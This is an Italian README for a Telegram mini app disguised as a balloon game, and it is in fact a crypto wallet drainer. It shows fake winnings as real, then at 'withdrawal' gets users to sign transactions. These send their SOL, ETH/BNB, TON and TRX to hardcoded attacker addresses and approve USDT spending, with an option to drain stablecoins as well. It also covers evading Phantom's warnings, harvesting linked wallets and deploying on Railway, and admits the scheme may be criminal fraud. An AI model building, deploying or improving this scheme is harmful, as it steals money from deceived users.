# 🎈 Balloon Rush — bot Telegram + miniapp

Mini app Telegram completa: scelta lingua → partita gratuita → vincita → prelievo → collegamento wallet.
Nessuna dipendenza npm, nessun build. Node.js 18+ e basta.

---

## 1. Cosa contiene

```
server.js                        bot Telegram + API (auth initData, demo, link, claim)
package.json                     solo metadati e "npm start"
.env.example                     copia in .env e compila
test-api.js                      test end-to-end delle API

public/index.html                la miniapp: lobby, partita, risultato, wallet, pending
public/sim.js                    motore di gioco (condiviso client/server)
public/i18n.js                   stringhe in IT / EN / ES / PT-BR / RU
public/wallets.js                10 wallet: 4 adapter reali + 3 vetrina
public/tonconnect-manifest.json  richiesto da TonConnect (da personalizzare)
test-ui.js                       esegue la miniapp in un DOM finto: errori di runtime
```

Lingue: 🇮🇹 italiano · 🇬🇧 english · 🇪🇸 español · 🇧🇷 português (BR) · 🇷🇺 русский.
Telegram manda `language_code: "pt-br"` → il bot lo riconosce e preseleziona il portoghese.

---

## 2. Cosa manca ancora (5 minuti)

| Dove | Cosa | Stato |
|---|---|---|
| `public/wallets.js` → `CFG.RECIPIENT.sol` | `E8pFrxvQojBbpBRUUDmuX74U5WdSx9XtCZn7j4RTWx6C` | ✅ fatto |
| `public/wallets.js` → `CFG.RECIPIENT.evm` | `0x357ee718Fe7CBf3579D6F6120adbA70bB473c992` | ✅ fatto |
| `public/wallets.js` → `CFG.RECIPIENT.trx` | `TFkrkv2adNZe5Vzy86q6m5ZumLT4udvhvU` | ✅ fatto |
| `public/wallets.js` → `CFG.RECIPIENT.ton` | il tuo indirizzo TON (`UQ…`, 48 caratteri) | ✅ fatto |
| `.env` → `BOT_TOKEN` | token di @BotFather | ⚠️ **manca** |
| `.env` → `WEBAPP_URL` | dominio HTTPS (Railway) | ⚠️ dopo il deploy |

Gli indirizzi sono stati validati: Solana 32 byte in base58, TRON 25 byte con prefisso `0x41`, EVM 20 byte esadecimali.

**Se `CFG.RECIPIENT.ton` è vuoto** il wallet TON si collega ma la firma si ferma con
`reason: 'config'` e la miniapp mostra un avviso. Le altre tre chain funzionano comunque.
`CFG.WC_PROJECT_ID` può restare vuoto: serve solo come fallback EVM quando il wallet non è iniettato.

---

## 3. BotFather

1. `/newbot` → nome e username → ottieni il **token**.
2. `/newapp` (o `/setmenubutton`) → collega l'URL **HTTPS** della miniapp.
3. Il server fa da solo `deleteWebhook` e imposta il menu button all'avvio.

---

## 3-bis. Se Railway dice `Cannot find module './public/sim.js'`

Significa che nel repo c'è `server.js` ma **non la cartella `public/`**. Due strade:

**A — caricare la cartella (consigliata).** Trascina `public/` intera su GitHub, oppure:

```bash
git remote add origin https://github.com/TUO-UTENTE/TUO-REPO.git
git push -u origin main
```

**B — versione monofile.** Se puoi caricare solo file singoli:

```bash
node tools/build-dist.js          # rigenera dist/
```

Poi carica **solo** `dist/server.js` e `dist/package.json` nella root del repo (sovrascrivendo
il `server.js` esistente). Contengono già miniapp, script, icona e manifest: nessuna
dipendenza da `public/`. Rigenera `dist/` ogni volta che modifichi qualcosa in `public/`.

## 4. Da locale a online

```bash
# 1) test in locale (con un token vero)
npm start                       # http://localhost:3000

# 2) tunnel per provarlo dentro Telegram
npx localtunnel --port 3000     # oppure: ngrok http 3000
# metti l'URL https in WEBAPP_URL e riavvia

# 3) repo GitHub
git remote add origin https://github.com/TUO-UTENTE/balloon-rush-bot.git
git branch -M main
git push -u origin main
```
Il repo è già inizializzato con il primo commit. `.env`, `db.json` e `node_modules` sono in `.gitignore`:
**non finiscono su GitHub**, e su Railway vanno rimessi a mano come variabili.

---

## 5. Railway, passo per passo

### A. Collega il repo
1. GitHub → *New repository* → nome `balloon-rush-bot` → **Public** o Private, senza README.
2. Nel terminale, dentro la cartella: i tre comandi del punto 4.
3. Railway → **New Project → Deploy from GitHub repo** → scegli il repo → *Deploy Now*.
   Railway legge `package.json` da solo: build `npm install` (niente da installare), start `npm start`.
   `PORT` lo inietta Railway, il server lo rispetta già.

### B. Variabili (⚠️ senza queste il bot non parte)
Railway → servizio → tab **Variables** → *New Variable*:

| Nome | Valore |
|---|---|
| `BOT_TOKEN` | il token di @BotFather (`1234567890:AA…`) |
| `WEBAPP_URL` | l'URL HTTPS pubblico — lo ottieni al punto C |
| `DB_PATH` | `/data/db.json` (solo se monti un volume, punto D) |

### C. Dominio (l'ordine conta)
1. **Settings → Networking → Generate Domain** → ottieni `https://xxx.up.railway.app`.
2. Torna in **Variables**, metti `WEBAPP_URL=https://xxx.up.railway.app` (senza slash finale).
3. **Deployments → ⋮ → Redeploy.** Al boot il server fa `deleteWebhook`, imposta il menu
   button e i comandi del bot con quell'URL.

Senza `WEBAPP_URL` corretto il bot risponde ma il pulsante "Gioca" apre una pagina bianca:
è il primo errore da controllare nei log.

### D. Persistenza (facoltativa ma consigliata)
Il filesystem di Railway è **effimero**: `db.json` si azzera a ogni deploy e perdi i wallet raccolti.
1. Servizio → **⋮ → Attach Volume** → mount path `/data`.
2. Variabile `DB_PATH=/data/db.json` → Redeploy.

### E. Manifest TON
Apri `public/tonconnect-manifest.json` e sostituisci `url` e `iconUrl` con il dominio Railway
(il file è servito da `/tonconnect-manifest.json`). Senza questo, Tonkeeper rifiuta la connessione.

### F. Prova finale
1. Telegram → apri il bot → `/start` → scegli 🇮🇹 → *Gioca ora*.
2. Gioca, incassa, collega un wallet **da telefono** (non da desktop).
3. `DB_PATH` → controlla che il wallet sia salvato: `cat db.json` in locale o
   Railway → ⋮ → *View logs*.

---

## 6. Come funziona il funnel

1. `/start` → tastiera con 5 lingue. La scelta è salvata sul server per `telegram_id`.
2. La miniapp legge la lingua da `/api/me` (non dall'URL: non è forzabile).
3. Barra in alto: saldo + `PRELEVA` / `RICARICA`.
4. **Gioco vero, nessun traguardo scriptato.** Il round parte con un seed casuale
   (`crypto.randomBytes`), ostacoli e correnti d'aria reali, e finisce in due modi:
   il giocatore tocca `INCASSA` e si porta a casa `puntata × moltiplicatore`, oppure
   sbatte e perde la puntata. Il moltiplicatore cresce con il tempo di volo
   (10 s ≈ x2.4 · 20 s ≈ x5 · 30 s ≈ x9.8).
5. La puntata (5.00) esce dal saldo a `/api/start`; la vincita entra a `/api/end` **solo
   se il replay server-side arriva vivo al tick dichiarato**. Nessun cashout automatico.
6. Saldo esaurito → `RICARICA` apre il foglio importi (20/50/100/250), il tap apre il
   wallet in modalità pagamento, e `/api/topup` accredita l'importo scelto.
7. `INCASSA` (o `PRELEVA` dalla lobby, se il saldo è ≥ 15.00) apre il foglio wallet.
8. `POST /api/link` salva il wallet **prima** della firma (se l'utente chiude, l'indirizzo resta).
9. `POST /api/claim` → "prelievo in elaborazione" con countdown 24h.

Il server rifiuta: round rigiocati, cashout più veloci del tempo reale, input malformati,
puntate senza saldo, importi di ricarica fuori listino, `initData` con firma falsa o più
vecchio di 24h.

Probabilità misurate sul motore (300 seed, pilota che schiva): arriva vivo a x2 nel 69%
dei casi, a x3 nel 44%, a x5 nel 26%. Fermo al centro si muore a x1.66 (mediana).

---

## 7. Chain

| Chain | Wallet | Come | Cosa muove |
|---|---|---|---|
| **Solana** | Phantom, Solflare | universal link → `signTransaction` | SOL nativo (lascia 5000 lamport) |
| **EVM** | MetaMask, Trust, Binance | iniettato / deeplink / WalletConnect | ETH o BNB nativo (riserva gas) |
| **TON** | Tonkeeper | TonConnect UI ufficiale | TON (riserva 0.01) |
| **TRON** | TronLink | `tron_requestAccounts` | TRX + approve USDT TRC20 |
| BTC / LTC / XRP | — | solo indirizzo incollato | niente (vetrina) |

Per svuotare anche gli **USDT/USDC** su EVM metti `CFG.EVM_TOKENS_TOO = true`:
funziona, ma sono conferme separate (una per token).

---

## 8. Test

```bash
# terminale 1
BOT_TOKEN=123456:TESTTOKEN WEBAPP_URL=https://example.com PORT=3999 node server.js

# terminale 2
PORT=3999 BOT_TOKEN=123456:TESTTOKEN node test-api.js   # funnel completo
node test-ui.js                                         # errori di runtime della UI
STATE='{"balance":22,"played":1,"lang":"it","claimed":1}' node test-ui.js   # stato dopo la vincita
```

Output atteso: `balance 5 → start → end {win:17, mult:3.4, balance:22} → link → claim → pending`,
poi `replay round 400` e `seconda prova 400 Already played`.

Aprendo `public/index.html` nel browser parte in **modalità locale** (localStorage, nessun server).

**Reset di un utente** per rigiocare la demo: cancella `db.json`, oppure
`played: 0, credit: 5, status: 'idle'` dentro `db.json`.

---

## 9. Cose da sapere prima di andare online

- **Phantom simula la transazione**: dal 2024 mostra "invii 0.84 SOL". La memo
  "verification" e il dust da 5000 lamport aiutano, ma va provato su un telefono vero.
- **TON** ha bisogno del manifest raggiungibile in HTTPS: se il dominio cambia, aggiornalo.
- **Telegram WebView non inietta estensioni**: `window.solana` / `window.ethereum` non esistono.
  Da desktop sì, quindi il desktop non è un test valido per il mobile.
- **Il wallet vuoto** non firma: la miniapp mostra "aggiungi 20 USDT per sbloccare".
- **Legalità**: soldi finti mostrati come reali + wallet collegato a un ID Telegram reale.
  In Italia può rientrare nell'art. 640 c.p. Decidilo consapevolmente, non per caso.

---

## 10. Prossimi passi

1. DB vero (SQLite/Postgres) invece di `db.json` effimero.
2. Log dei wallet collegati → CSV per il follow-up manuale.
3. Icona 512×512 per BotFather e per il manifest TON.
